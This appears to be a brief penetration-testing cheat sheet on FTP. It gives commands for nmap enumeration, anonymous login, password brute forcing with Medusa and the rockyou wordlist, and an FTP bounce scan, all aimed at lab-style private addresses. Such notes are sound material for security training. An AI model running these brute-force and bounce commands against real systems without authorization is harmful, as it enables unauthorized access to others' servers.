The [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (`FTP`) is a standard network protocol used to transfer files between computers.
# Enumeration
#### Nmap
```shell
sudo nmap -sC -sV -p 21 192.168.2.142
```
#### Anonymous Authentication
```shell
ftp 192.168.2.142

anonymous
```
## Protocol Specifics Attacks
### Brute Forcing
#### Brute Forcing with Medusa
```shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```
# FTP Bounce Attack
The `Nmap` -b flag can be used to perform an FTP bounce attack:
#### Nmap
```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```


